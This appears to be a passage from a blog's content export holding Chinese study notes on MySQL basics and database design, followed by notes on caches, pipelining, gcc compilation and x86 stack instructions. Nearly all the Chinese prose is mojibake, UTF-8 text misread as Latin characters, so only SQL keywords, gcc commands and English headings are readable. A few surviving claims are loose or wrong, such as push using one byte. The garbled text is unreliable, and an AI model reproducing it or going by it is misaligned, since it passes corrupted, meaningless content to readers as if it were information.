çš„ç¬”è®°ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šå¯¹äºæ›´æ·±åˆ»çš„ç»†èŠ‚è¿›è¡Œè€ƒç©¶ï¼Œä¹Ÿä¸ä¼šä»‹ç»æ€ä¹ˆå®‰è£…å’Œé…ç½®MySQLçš„ç¯å¢ƒä»¥åŠä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ä½¿ç”¨å…³ç³»å‹æ•°æ®åº“ã€‚\n1.Table # åˆ›å»ºè¡¨ï¼šæœ‰Bæ ¼çš„åˆ›å»ºä¸€å¼ è¡¨\næŸ¥çœ‹è¡¨ç»“æ„ï¼šdesc\ndelete:drop table if exists; ä¿®æ”¹è¡¨å­—æ®µ\n**`alter table \u0026lt;name\u0026gt; add/change/modify \u0026lt;name\u0026gt; \u0026lt;name1\u0026gt;â€¦â€¦`** **`alter table \u0026lt;name1\u0026gt; rename to \u0026lt;name2\u0026gt;`** delete from student; ç»å¯¹ä¸è¦ç”¨è¿™æ ·çš„æ–¹å¼å»æ¸…ç©ºä¸€å¼ è¡¨\n1.éå†åˆ é™¤ï¼Œä¼šæµªè´¹æ—¶é—´å’Œèµ„æº\n2.è‹¥è®¾ç½®auto increment ä¸»é”®ï¼Œé‚£ä¹ˆå†åŠ å…¥æ•°æ®çš„æ—¶å€™ä¼šä»åŸæ¥å¢é•¿çš„éƒ¨åˆ†ç»§ç»­\ntruncate table student; ç›´æ¥æŠ¥åºŸè¡¨å¹¶ä¸”åˆ›å»ºä¸€å¼ å’ŒåŸæ¥ä¸€æ ·çš„æ–°è¡¨\n2.Data # update data:\n`update \u0026lt;tablename\u0026gt; set \u0026lt;field\u0026gt;=\u0026lt;newValue\u0026gt; where \u0026lt;field\u0026gt;=\u0026lt;value\u0026gt;;` search data from table:\n`select \u0026lt;fieldname,â€¦\u0026gt; from \u0026lt;tablename\u0026gt;;` `select* from\u0026lt;tablename\u0026gt;` database definition language: create drop alter show\ndata manipulation language: insert delete update select\ndatabase control language: å…³äºæ•°æ®åº“çš„è§’è‰²æ§åˆ¶ï¼Ÿ\n3.DataType # Decimalæ•°æ®å­˜å‚¨åŸç†ï¼Ÿ\nenumæšä¸¾ç±»å‹ï¼šä»…èƒ½é€‰å–å…¶ä¸­å·²ç»æœ‰çš„å…ƒç´ æ¥å­˜å‚¨ï¼Œä»£è¡¨ä»ä¸€å¼€å§‹çš„æ•°å­—\nseté›†åˆç±»å‹:èƒ½ä»é›†åˆä¸­é€‰å–å¤šä¸ªå…ƒç´ è¿›è¡Œå­˜å‚¨â€”â€”ç”¨æˆ·å…´è¶£æ ‡ç­¾\nsetå­˜å‚¨åŸç†ï¼Ÿï¼Ÿï¼Ÿ\n4.åˆ—å±æ€§å®Œæ•´æ€§(é‡ç‚¹) # auto_increment å¿…é¡»æ˜¯ primarykeyä¸»é”® primary keyä¸»é”®ï¼šå”¯ä¸€æ€§â€”\u0026gt;ä¸€ç»„æˆ–è€…ä¸€ä¸ªå­—æ®µ # 1.ä¿è¯æ•°æ®çš„å®Œæ•´æ€§\n2.åŠ å¿«æ•°æ®çš„æŸ¥è¯¢é€Ÿåº¦â€”ç”¨æ¥åšè¡¨çš„å…³è”\n`alter table \u0026lt;tablename\u0026gt; add primary key (\u0026lt;filedname\u0026gt;......);`æ·»åŠ ä¸»é”®ï¼Œå¤šä¸ªå­—æ®µå°±æ˜¯**ç»„åˆé”®** `alter table \u0026lt;tablename\u0026gt; drop primary key;` å¤åˆä¸»é”®è§£å†³çš„é—®é¢˜\nuniqueå”¯ä¸€é”®\nå’Œprimaryçš„åŒºåˆ«ï¼šå¯ä»¥ä¸ºnullï¼Œä¸å’Œå…¶ä»–è¡¨äº§ç”Ÿå…³è”ï¼Œä½†æ˜¯å¿…é¡»å”¯ä¸€ï¼ˆnullä¸å”¯ä¸€ï¼‰\ndelete:`alter table \u0026lt;tablename\u0026gt; drop index \u0026lt;filedname\u0026gt;;` comment æ³¨é‡Šé—®é¢˜\nSQLå†…æ³¨é‡Šå’Œä»£ç æ³¨é‡Š\næ•°æ®åº“çš„å®Œæ•´æ€§é—®é¢˜\nForeign Keyï¼ˆå¤–é”®çº¦æŸæŠ€æœ¯ï¼‰ # æ€ä¹ˆåœ¨ä¸¤å¼ è¡¨ä¹‹é—´å»ºç«‹è”ç³»ï¼Ÿ\nä¸»è¡¨ï¼š\nå»ºç«‹ä»è¡¨ï¼š\nä»è¡¨ï¼š\n`alter table \u0026lt;tablename\u0026gt; add foreign key (\u0026lt;filedname\u0026gt;) references \u0026lt;tablename\u0026gt;(\u0026lt;filedname\u0026gt;);` `show create table \u0026lt;tablename\u0026gt;;` æŸ¥çœ‹åˆ›å»ºçš„è¡¨ç»“æ„å¹¶ä¸”åˆ é™¤å¤–é”®\nå½“ä¸»è¡¨ä¸­çš„æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œä»è¡¨ä¸­çš„æ•°æ®åº”è¯¥å¦‚ä½•ä¿®æ”¹ï¼Ÿ\nç½®ç©ºå’Œçº§è”çš„æ“ä½œï¼ˆåœ¨åˆ›å»ºè¡¨çš„æ—¶å€™å°±è¦å£°æ˜æ¸…æ¥šï¼‰ # ç½®ç©ºï¼šä¸»è¡¨ä¸­çš„æ•°æ®è¢«åˆ é™¤ï¼Œé‚£ä¹ˆä»è¡¨ä¸­çš„æ•°æ®ä¾ç„¶ä¿å­˜ï¼Œä½†æ˜¯å¤–é”®çš„è¢«åˆ é™¤çš„å­—æ®µä¸ºNULLï¼›\nçº§è”ï¼šä¸»è¡¨ä¸­çš„æ•°æ®å‘ç”Ÿä¿®æ”¹ï¼Œä»è¡¨ä¸­çš„å¤–é”®å¯¹åº”å­—æ®µçš„æ•°æ®å…¨éƒ¨å‘ç”Ÿä¿®æ”¹ï¼›\nå¦‚å›¾ï¼šåˆ é™¤â€”â€”set null\n5.æ•°æ®åº“è®¾è®¡æ€ç»´ # a.åŸºæœ¬æ¦‚å¿µ # å…³ç³»ï¼šä¸¤å¼ è¡¨é€šè¿‡å…±åŒçš„å­—æ®µæ¥ç¡®ç«‹æ•°æ®çš„å®Œæ•´æ€§\nè¡Œâ€”â€”ä¸€æ¡æ•°æ®â€”â€”å®ä½“\nåˆ—â€”â€”ä¸€ä¸ªå­—æ®µâ€”â€”å±æ€§\næ•°æ®å†—ä½™ï¼šç‰ºç‰²ç©ºé—´ï¼Œæå‡æŸ¥è¯¢æ€§èƒ½ï¼ˆé«˜è€ƒæ€»åˆ†ï¼‰\nb.å®ä½“ä¹‹é—´çš„å…³ç³» # ä¸€å¯¹å¤šï¼ˆå­¦ç”Ÿè¡¨å’Œé£Ÿå ‚æ¶ˆè´¹è®°å½•ä¹‹é—´çš„å…³ç³»ï¼‰\nä¸€å¯¹ä¸€\nå¤šå¯¹ä¸€\nå¤šå¯¹å¤š\nc.èŒƒå¼ # Coddç¬¬ä¸€èŒƒå¼ï¼šç¡®ä¿å­—æ®µçš„åŸå­æ€§ï¼Œä¸€ä¸ªå­—æ®µä¸å¯ä»¥å†åˆ† 2018-2019 â€”â€” 2018 2019\nCoddç¬¬äºŒèŒƒå¼ï¼šéé”®å­—æ®µå¿…é¡»ä¾èµ–äºä¸»é”®å­—æ®µï¼ˆæ— å…³çš„å­—æ®µä¸åº”å½“åŠ å…¥ï¼Œä¸€å¼ è¡¨åªæè¿°ä¸€ç§ä¿¡æ¯ï¼‰\nCoddç¬¬ä¸‰èŒƒå¼ï¼šæ¶ˆé™¤ä¼ é€’ä¾èµ–â€”â€”æ ¹æ®å®é™…æƒ…å†µï¼Œæˆ‘ä»¬åˆ°åº•è¦ä¸è¦è€ƒè™‘åŠ å…¥æ•°æ®å†—ä½™çš„å¤„ç†\n6.å•è¡¨æŸ¥è¯¢ # a.åŸºæœ¬å…³é”®å­— # select # from # æŒ‡å®šè¦æŸ¥çš„è¡¨ï¼›è¿”å›ä¸¤å¼ è¡¨çš„ç¬›å¡å°”ç§¯\ndual # é»˜è®¤çš„ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œå•è¡Œå•åˆ—\nwhere # é™åˆ¶selectæŸ¥è¯¢æ¡ä»¶ \u0026lt; â‰¤ \u0026gt; â‰¥ or andâ€¦â€¦\nin # é™å®šæŸ¥è¯¢çš„å­—æ®µçš„å€¼åœ¨ä¸€ä¸ªèŒƒå›´ä¹‹å†…\nbetweenâ€¦andâ€¦ # é™åˆ¶æŸ¥è¯¢çš„èŒƒå›´åœ¨ç»™å®šçš„é—­åŒºé—´å†…éƒ¨\nis null # æŸ¥çœ‹æ˜¯ç©ºæˆ–è€…éç©ºï¼Œç®€å•\nå‡ ç§å¸¸è§çš„èšåˆå‡½æ•° # [!TIP]\n**Q:select count(*) and select count(1); **\nwhatâ€™s the difference?\nlikeæ¨¡ç³ŠæŸ¥è¯¢â€”â€”é€šé…ç¬¦ # group byåˆ†ç»„æŸ¥è¯¢ # select \u0026lt;function-name\u0026gt;(\u0026lt;fieldname1\u0026gt;) as \u0026#39;alias1\u0026#39;, \u0026lt;fieldname2\u0026gt; as \u0026#39;alias2\u0026#39; group by \u0026lt;fieldname2\u0026gt;;#è¦æ ¹æ®å“ªä¸ªå­—æ®µå»æŸ¥è¯¢ æ¯”å¦‚æƒ³æ±‚ç”·æ€§å’Œå¥³æ€§çš„å¹³å‡å¹´é¾„ï¼š\nåˆ©ç”¨group_concatå‡½æ•°æŸ¥è¯¢å¯¹åº”å­—æ®µå¯¹åº”çš„å®ä½“\nhaving # å’Œwhereä¸€æ ·ä½œä¸ºæ¡ä»¶ç­›é€‰ï¼Œä½†æ˜¯ï¼š\n1.whereæ˜¯æ ¹æ®æ¡ä»¶å¯¹äºå®é™…å­˜åœ¨äºæ•°æ®åº“ä¸­çš„æ•°æ®è¿›è¡Œç­›é€‰\n2.havingå¯¹äºæŸ¥è¯¢ä¹‹åçš„è™šæ‹Ÿè¡¨ä½¿ç”¨â€”â€”æ¯”å¦‚é…åˆgroup_by(æ­¤æ—¶å°±ä¸èƒ½ä½¿ç”¨whereæ¡ä»¶æ¥å¤„ç†)\nlimit # é€‰å–é¡ºåºä¸­çš„ä¸‹æ ‡èŒƒå›´\nselect \u0026lt;fieldname\u0026gt; from \u0026lt;tablename\u0026gt; limit \u0026lt;start-index\u0026gt;,\u0026lt;length\u0026gt;; distinct # å»é‡å¤å…³é”®å­—\né»˜è®¤æƒ…å†µä¸‹æœ‰all\nselect (all) \u0026lt;fieldname\u0026gt; from \u0026lt;tablename\u0026gt;; è‡³æ­¤ï¼Œå•è¡¨æŸ¥è¯¢åŸºç¡€ç»“æŸã€‚\n7.å¤šè¡¨æŸ¥è¯¢ # 1.union # selectâ€¦ + union + DISTINCT + selectâ€¦ å¯¹åº”å­—æ®µä¸ªæ•°å¿…é¡»ç›¸ç­‰\n2.join # ç”¨ä¸¤ä¸ªè¡¨åˆ›å»ºå…¬å…±å­—æ®µè¿›è¡Œè¿æ¥â€”â€”å†…è¿æ¥â€”â€”æœ‰å¤šå¼ è¡¨å°±ç”¨å¤šä¸ªinnerè¿›è¡Œè¿æ¥\nselect f1,f2 from t1 inner join t2 on t1.f3=t2.f4 (having score \u0026gt; 90); left join ä»¥å·¦è¡¨ä¸ºä¸€ä¸ªåŸºå‡†ï¼ˆå°±ç®—å·¦è¾¹æ²¡æœ‰ä¹Ÿè¦å†™ä¸Šå» right join åŒç†ï¼‰\ncross joinè¿”å›ä¸¤å¼ è¡¨çš„ç¬›å¡å°”ç§¯\nselect* from t1 cross join t2; natural joinè‡ªåŠ¨å¯»æ‰¾å…¬å…±å­—æ®µå¹¶ä¸”å»ºç«‹inner joinçš„è¿æ¥\næ²¡æœ‰å…¬å…±å­—æ®µå°±è¿”å›cross joinçš„ç»“æœ\nusing\nå½“ä¸¤å¼ è¡¨çš„å­—æ®µå®Œå…¨ç›¸åŒçš„æ—¶å€™ï¼ŒusingæŒ‡å®šå»ºç«‹è¿æ¥çš„å…¬å…±å­—æ®µ\n8.å­æŸ¥è¯¢ # ç”¨ä¸€ä¸ªselectè¯­å¥è¿”å›çš„æ•°æ®èŒƒå›´ä½œä¸ºé™åˆ¶çš„åŸºå‡†ï¼ˆç”¨inå’Œnot in æ¥æ§åˆ¶ï¼‰\nåªè¦å­˜åœ¨å°±å…¨éƒ¨æŸ¥è¯¢ exists and not exists\nè‡³æ­¤ï¼Œæ‰€æœ‰åŸºç¡€å†…å®¹ç»“æŸï¼Œä»¥ä¸Šçš„å†…å®¹éƒ½æ˜¯å¯¹äºä¸€åå®ä¹ ç”Ÿæ¥è¯´æœ€ä¸ºé‡è¦çš„å†…å®¹ï¼ˆæ¯ä¸€ç§è¯­æ³•å•ç‹¬çœ‹æ¥éƒ½æ˜¯å¾ˆå¥½ç†è§£çš„ï¼Œä½†æ˜¯éƒ½è”åˆèµ·æ¥çš„è¯å°±æ˜¾å¾—å¾ˆå›°éš¾ï¼‰ï¼Œä»¥ä¸‹ä¸ºæ‰©å±•ï¼š\næ‰©å±•å†…å®¹ï¼š # 1.è§†å›¾(View) # ä½œç”¨ï¼šç®€åŒ–SQLæŸ¥è¯¢ï¼›æ©ç›–æ•æ„Ÿæ•°æ®\nåˆ›å»ºè§†å›¾\nä»¥åå°±å¯ä»¥ç›´æ¥æŸ¥è¯¢\nalterä¿®æ”¹è§†å›¾\ndropç›´æ¥åˆ é™¤è§†å›¾\nè§†å›¾åº•å±‚ç®—æ³•ï¼ˆåœ¨ä½¿ç”¨å­æŸ¥è¯¢åˆ›å»ºè§†å›¾çš„æ—¶å€™ï¼‰\nunchecked\n1.temp table ä¸´æ—¶è¡¨ç®—æ³•\n2.merge åˆå¹¶ç®—æ³•\nQ:æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ\n2.äº‹åŠ¡ï¼ˆTransactionï¼‰ # å¤„ç†éå¸¸ä¸¥è°¨çš„æ“ä½œï¼Œä¾‹å¦‚è½¬è´¦ç­‰\nè®¾ç½®å›æ»šç‚¹ å¹¶ä¸”è¿”å›â€”â€” rollback to\näº‹åŠ¡çš„ACIDç‰¹æ€§\nåŸå­ï¼šä¸€ä¸ªäº‹åŠ¡ä¸å¯å†åˆ†ï¼Œè¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆä¸æ‰§è¡Œ\néš”ç¦»ï¼šå¤šä¸ªäº‹åŠ¡åŒæ—¶å¯¹ä¸€ä¸ªæ•°æ®åº“è¿›è¡Œæ“ä½œï¼Œä¸ä¼šäº§ç”Ÿå†²çª\næ³¨æ„ï¼šä»…å½“engine=innodbçš„æ—¶å€™ï¼Œæ‰èƒ½ä½¿ç”¨äº‹åŠ¡\n3.indexï¼ˆç´¢å¼•ï¼‰ # å¿«é€ŸæŸ¥è¯¢æ•°æ®â€”â€”å®ä¹ ç”Ÿè¦ç†è§£åˆ°ä»€ä¹ˆç¨‹åº¦ï¼Ÿ\n4.å­˜å‚¨è¿‡ç¨‹ # æå‰å†™å¥½SQLä¸€æ¬¡æ‰§è¡Œï¼Œæœ‰ç‚¹åƒå‡½æ•°\nåˆ©ç”¨delimiterè®¾ç½®ç»“æŸç¬¦å·\nä¼ä¸šè§„èŒƒçº¦æŸ # 1.åº“è¡¨å­—æ®µçš„çº¦æŸè§„èŒƒ # æ˜¯å¦ï¼š is_vip unsigned tiny int length1ï¸âƒ£ ï¼ˆä¸èƒ½æµªè´¹å­˜å‚¨ï¼‰\ndontâ€™s\nä¸èƒ½æœ‰å¤§å†™å­—æ¯ï¼Œ\nä¸èƒ½ä»¥æ•°å­—å¼€å¤´ï¼Œ\nä¸‹åˆ’çº¿ä¹‹é—´ä¸èƒ½åªæœ‰æ•°å­—ï¼Œ\nä¸èƒ½å‡ºç°è´Ÿæ•°ï¼Œ\nä¸èƒ½æœ‰å…³é”®å­—\nå‡¡æ˜¯æœ‰å°æ•°ï¼Œå¿…é¡»ç”¨decimalæ•°æ®ç±»å‹\ndos\nä¸»é”®ï¼špk_keyï¼Œ\nå­—ç¬¦ä¸²é•¿åº¦è¾ƒå°æ—¶ï¼Œè¯·ä½¿ç”¨charï¼Œ\nå¼ºåˆ¶å­˜åœ¨çš„å­—æ®µï¼š\n1.id(unsigned bigint å•è¡¨çš„æ—¶å€™å¿…é¡»è‡ªå¢ primary key)\n2.create_time(datetime)\n3.update_time(datatime),\n2.ç´¢å¼•è§„èŒƒ # æœ‰æŸäº›å¿…é¡»ï¼šå”¯ä¸€ç´¢å¼•\nä¸èƒ½æŸ¥ä¸¤ä¸ªä»¥ä¸Šçš„å…³è”æŸ¥è¯¢\nvarcharä¸Šå»ºç«‹ç´¢å¼•ï¼šå»ºç«‹ç´¢å¼•çš„é•¿åº¦\n3.SQLå¼€å‘çº¦æŸ # count(xx,xxx,xx) count(*);\nåˆ¤æ–­ä¸ºç©ºçš„æ–¹æ³•ï¼š\nwhere name = null ï¼›\nwhere name is nullï¼›\nä¸è¦ä½¿ç”¨å¤–é”®å’Œçº§è”ï¼ˆå°¤å…¶æ˜¯åœ¨é«˜å¹¶å‘çš„é¡¹ç›®ä¸­ï¼Œç‰µä¸€å‘è€ŒåŠ¨å…¨èº«ï¼‰\nè¿™äº›é—®é¢˜åœ¨Serverå±‚è§£å†³\nä¸å…è®¸ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹ï¼ˆå¾ˆéš¾è°ƒè¯•ï¼Œå…¶ä¸­çš„SQLå†™é”™äº†æ€ä¹ˆåŠï¼Œå’Œè„šæœ¬ä¸ä¸€æ ·ï¼Œç§»æ¤æ€§ä¹Ÿå¾ˆå·®ï¼‰\nutf-8ä½œä¸ºæ ‡å‡†ç¼–ç æ ¼å¼\n4.å…¶ä»–çº¦æŸ # ORMæ¡†æ¶æŸ¥è¯¢ä¸èƒ½å†™*\nQ:pujoç±»boolç±»å‹ä¸èƒ½åŠ is?\n","date":"12 March 2025","externalUrl":null,"permalink":"/tech/mysql/","section":"Tech","summary":"","title":"MySQL","type":"tech"},{"content":" Computer Organization # [!NOTE]\nåœ¨æœ¬ç¯‡ä¹‹å‰ï¼Œæˆ‘å·²ç»å®ç°äº†ä¸€ä¸ªéå¸¸ç®€å•çš„CPUï¼ˆæ„Ÿè§‰éƒ½æ˜¯å±äºæ•°å­—ç”µè·¯çš„å†…å®¹ï¼Œå½“ç„¶ä¹Ÿæ˜¯è®¡ç»„çš„ä¸€éƒ¨åˆ†ï¼‰ï¼Œè¯¾ç¨‹ç¬”è®°ä»¥åŠèµ„æºéƒ½æ¥è‡ªäºBç«™ï¼šCs Primerã€‚\næ‰€ä»¥åœ¨è¿™é‡Œåªæ˜¯ç®€å•è®°å½•ä¸€äº›æ„Ÿè§‰æœ‰å¿…è¦çš„ç†è®ºçŸ¥è¯†ï¼Œè¿˜ä¼šä¸æ–­è¡¥å……ã€‚\nCacheï¼ˆå­˜å‚¨å™¨å±‚æ¬¡ç»“æ„ï¼‰ # 1.DRAM SRAM SSD æœºæ¢°ç¡¬ç›˜è¯»å†™ä»¥åŠå­˜å‚¨ï¼Œå–å†…å­˜å’Œå®é™…CPUä¹‹é—´çš„å·®å¼‚æ€§ã€‚\n2.ç¨‹åºçš„å±€éƒ¨æ€§ï¼ˆLocalityï¼‰:ç¨‹åºå€¾å‘äºå¼•ç”¨é‚»è¿‘äºæœ€è¿‘å¼•ç”¨è¿‡çš„æ•°æ®é¡¹æˆ–è€…æ˜¯å·²ç»å¼•ç”¨è¿‡çš„æ•°æ®é¡¹æœ¬èº«ï¼ˆforéå†æ•°ç»„ï¼‰\na.ç©ºé—´å±€éƒ¨æ€§ b.æ—¶é—´å±€éƒ¨æ€§\nå¼•å…¥ï¼š\né«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ # 1.ç»“æ„ # SBEä¸ºæ€»çš„å¤§å°ã€‚\nå¯»å€åŸç†ï¼šhash\n2.ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜ï¼ˆdirect-mapped cacheï¼‰ # å°±æ˜¯æ¯ç»„åªæœ‰ä¸€ä¸ªè¡Œ\nè¿‡ç¨‹\na.ç»„é€‰æ‹©\nä¸ºä»€ä¹ˆæŠŠä¸­é—´çš„ä½ä½œä¸ºç»„ç´¢å¼•è€Œä¸æ˜¯æ›´é«˜çš„ä½ï¼Ÿ\nå¦‚æœé«˜ä½åšç´¢å¼•ï¼Œé‚£ä¹ˆå¾ˆå®¹æ˜“æŠŠä¸€å †è¿ç»­çš„å—æ˜ å°„åˆ°ä¸€ç»„é«˜é€Ÿç¼“å­˜å—é‡Œé¢ï¼Œè¿™æ ·ä¸ç¬¦åˆç©ºé—´å±€éƒ¨æ€§ã€‚\nä¸­é—´çš„éšæœºæ€§ç›¸å¯¹æ›´å¤§ä¸€äº›ã€‚\nb.æ‰¾åˆ°äº†ç»„ï¼Œè¿›è¡Œè¡ŒåŒ¹é…\nc.æ ¹æ®å—åç§»ä½æ¥å¯»æ‰¾ç¬¬ä¸€ä¸ªå­—èŠ‚çš„ä½ç½®\nd.å¦‚æœæ²¡æœ‰å‘½ä¸­ï¼Œä»ä¸‹ä¸€çº§å†…å­˜ä¸­å–ç›¸åº”çš„å†…å­˜å—å¹¶ä¸”ç›´æ¥åšæ›¿æ¢çš„æ“ä½œ\ne.å®é™…è¿‡ç¨‹ï¼šå¼€å§‹ç¼“å­˜ä¸ºç©ºï¼Œå†·ä¸å‘½ä¸­ï¼Œä»L2ä¸­åŠ è½½æ•°æ®åˆ°L1,ç„¶åè¿”å›ï¼Œæ¥ç€å‡å¦‚æ ‡å¿—ä½ä¸ç›¸åŒï¼Œå‘ç”Ÿå†²çªä¸å‘½ä¸­ï¼Œè¿›è¡Œæ›¿æ¢æ“ä½œã€‚\nd.å†²çªä¸å‘½ä¸­å¸¸è§ï¼šthrash,é«˜é€Ÿç¼“å­˜åå¤çš„åŠ è½½å’Œé©±é€ç›¸åŒçš„ä¸€äº›ç»„ã€‚\n3.ç»„ç›¸è”é«˜é€Ÿç¼“å­˜(set associative cache) # å°±æ˜¯æ¯ä¸ªç»„åŒ…å«å¤šäºä¸€ä¸ªçš„è¡Œ\nå’Œæ¯ä¸ªè¡Œè¿›è¡Œä¸€æ¬¡åŒ¹é…\nLFUå’ŒLRUç­–ç•¥\n4.å…¨ç›¸è”é«˜é€Ÿç¼“å­˜ï¼ˆfully asscociative cacheï¼‰ # å°±æ˜¯åªæœ‰ä¸€ä¸ªç»„ï¼Œé‡Œé¢æœ‰å¾ˆå¤šè¡Œ\næ²¡æœ‰ç»„çš„é€‰æ‹©ï¼Œåªæœ‰æ ‡è®°ä½å’Œå—åç§»ã€‚\nå•å‘¨æœŸå¤šå‘¨æœŸå¤„ç†å™¨ # ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸå†…å®Œæˆä¸€æ¡æŒ‡ä»¤\nå¤šå‘¨æœŸå°±æ˜¯ä¸€æ¡æŒ‡ä»¤å¤šä¸ªæ—¶é’Ÿå‘¨æœŸ\næµæ°´çº¿æŠ€æœ¯ # äº”é˜¶æ®µæµæ°´çº¿ # æŠŠæ¯ä¸ªæŒ‡ä»¤éƒ½å¡«å……æˆäº”ä¸ªé˜¶æ®µï¼Œé˜²æ­¢å†²çª\næµæ°´çº¿å†’é™© # ç»“æ„å†’é™©ï¼šç¡¬ä»¶èµ„æºäº§ç”Ÿå†²çª # æ•°æ®å†’é™©ï¼šé€»è¾‘ä¸Šçš„æ•°æ®ä¾èµ–æ€§äº§ç”Ÿå†²çª # æ§åˆ¶å†’é™©ï¼šè·³è½¬åˆ°åˆ«çš„æŒ‡ä»¤ï¼Œå¯¼è‡´æµæ°´çº¿ä¹‹å‰å‡†å¤‡çš„æŒ‡ä»¤æ— æ•ˆ # è§£å†³ï¼šåˆ†æ”¯é¢„æµ‹ï¼ˆåŠ¨æ€ï¼‰\nåœ¨X86ç³»ç»Ÿä¸Šç¼–å†™å’Œè¿è¡Œç¨‹åº # ä¸€ä¸ªCç¨‹åºå¤„ç†æµç¨‹ # é¢„å¤„ç†-ç¼–è¯‘-æ±‡ç¼–-é“¾æ¥-ç¨‹åºåŠ è½½æ‰§è¡Œ\nå‡è®¾æˆ‘ä»¬æœ‰æ–‡ä»¶main.c hello.c\ngcc main.c hello.c\t//è¿™ä¸€æ¡æŒ‡ä»¤åŒ…å«äº†ä¸Šè¿°çš„å››ä¸ªæ­¥éª¤ gcc -E hello.c -o hello.i //è¿™è¡¨ç¤ºå¯¹äºæ–‡ä»¶è¿›è¡Œé¢„å¤„ç† -oæ˜¯æŒ‡å®šåç§°ï¼ˆæ“¦é™¤å¹¶ä¸”è¿›è¡Œå¤åˆ¶ç²˜è´´çš„æµç¨‹ï¼‰ gcc -S hello.i -o hello.s\t//æŠŠé¢„å¤„ç†ä¹‹åçš„æ–‡ä»¶å¤„ç†æˆæ±‡ç¼–ä»£ç  gcc -c hello.s -o hello.o\t//æ±‡ç¼–æˆä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†æ˜¯ä¸è¿›è¡Œé“¾æ¥çš„æ“ä½œ å·¥å…·ï¼šreadelfï¼ˆæŸ¥çœ‹æ®µçš„åç§»ï¼‰ objdumpï¼ˆåæ±‡ç¼–ï¼‰ hexdumpï¼ˆæŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶çš„æœºå™¨ç ï¼‰\ngcc main.o hello.o\t//ç›´æ¥å°†ä¸¤ä¸ªæ–‡ä»¶è¿›è¡Œé“¾æ¥ï¼Œå¦‚ä¸‹æ˜¯é“¾æ¥çš„è¿‡ç¨‹ æ¥ç€æ˜¯ç¨‹åºåŠ è½½æ‰§è¡Œçš„æµç¨‹\nå¸¸è§X86æ±‡ç¼–æŒ‡ä»¤ # å¯ä»¥å‚ç…§CSAPPç†Ÿæ‚‰åŸºæœ¬è¯­æ³•ï¼Œè¾¾åˆ°èƒ½è¯»çš„è¦æ±‚å³å¯\n[!TIP]\njmpç±»æ¡ä»¶è·³è½¬æŒ‡ä»¤ä¹‹å‰å¯ä»¥è·Ÿå…¶ä»–è®¸å¤šæŒ‡ä»¤\næ¯”å¦‚ subl a,b ä¹Ÿå¯ä»¥çœ‹aå’Œbä¹‹é—´æ»¡è¶³çš„æ¡ä»¶\n64ä½ä½¿ç”¨çš„å¯„å­˜å™¨ # æ•°æ®ä¼ é€æŒ‡ä»¤ # moveï¼šä¸èƒ½ä»å†…å­˜ç›´æ¥åˆ°å†…å­˜ä¼ é€ # [!NOTE]\næˆ‘çœ‹è¿‡å¥½å‡ éä¹¦ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰è‡ªå·±æœ€éš¾ç†è§£çš„åœ°æ–¹å°±æ˜¯å‡½æ•°çš„è°ƒç”¨ä»¥åŠé€’å½’è¿™é‡Œçš„ä¸œè¥¿ï¼Œå»ºè®®å¤§å®¶ä»pushè¿™é‡Œå¼€å§‹ç»†ç»†ç†è§£ã€‚\npushæŒ‡ä»¤ï¼š # 1.æŠŠæ ˆæŒ‡é’ˆå‡å»8,å¾—åˆ°æ ˆé¡¶ä½ç½®ï¼Œæ­¤æ—¶æ ˆé¡¶è¿˜æ²¡æœ‰å…ƒç´ ã€‚2.æŠŠç›®çš„æ“ä½œæ•°æ”¾åˆ°æ ˆé¡¶ã€‚ï¼ˆpushåªè¦ä¸€ä¸ªbyteï¼Œæ ˆä¸Šåªæ˜¯æ”¾äº†ä¸€å †dataï¼Œå’Œå¯„å­˜å™¨ï¼Œå’Œå†…å­˜éƒ½æ²¡æœ‰å…³ç³»ï¼‰\né‚£ä¹ˆpopæŒ‡ä»¤åŒç†ï¼š1.æŠŠæ ˆé¡¶çš„å€¼è¯»å…¥ä¸€ä¸ªç›®æ ‡å¯„å­˜å™¨ã€‚2.æŠŠæ ˆæŒ‡é’ˆåŠ 8ã€‚\næ¡ä»¶æ§åˆ¶ # if for whileç­‰è¯­å¥éƒ½æ˜¯æ¡ä»¶è·³è½¬æ¥å®ç°çš„\nswitchè¯­å¥å½“caseèŒƒå›´è¾ƒå¤§æ—¶ä¹Ÿæ˜¯æ¡ä»¶è·³è½¬ï¼Œå½“èŒƒå›´è¾ƒå°æ˜¯åˆ©ç”¨è·³è½¬è¡¨ï¼Œä¸€ä¸ªè¿ç»­æ•°ç»„çš„å€¼åŸŸåŒ…å«äº†æ‰€æœ‰çš„caseæƒ…å†µ(å¹¶ä¸”caseçš„æ•°é‡è¾ƒå¤š)\n*Processï¼ˆè¿‡ç¨‹ï¼‰ # æ§åˆ¶ + ä¼ é€’ + å†…å­˜ç®¡ç†\nè¿è¡Œæ—¶æ ˆï¼ˆæå‰å‡†å¤‡ï¼‰ # På»è°ƒç”¨Qï¼Œé¦–å…ˆå­˜æ”¾è¿”å›åœ°å€ï¼Œè¡¨æ˜Qè¿”å›æ—¶ä»Pçš„å“ªä¸ªä½ç½®å¼€å§‹æ‰§è¡Œï¼Œè¿™ä¸ªåœ°å€ä¹Ÿæ˜¯Pæ ˆå¸§çš„ä¸€éƒ¨åˆ†ã€‚\næ¥ç€ä¸ºQåˆ†é…ä¸€ä¸ªæ ˆå¸§ï¼Œå¤§å¤šæ•°çš„æ ˆå¸§éƒ½æ˜¯å®šé•¿çš„ï¼Œé€šè¿‡å¯„å­˜å™¨ä¼ é€’å‚æ•°ï¼Œå¦‚æœå¤§äº6ä¸ªï¼ŒPåœ¨è°ƒç”¨Qä¹‹å‰æå‰åœ¨è‡ªå·±çš„æ ˆå¸§é‡Œå­˜å‚¨å¥½è¿™äº›å‚æ•°ã€‚\nè½¬ç§»æ§åˆ¶ï¼ˆæ€ä¹ˆäº¤æ¥æ§åˆ¶æƒåˆ©ï¼‰ # 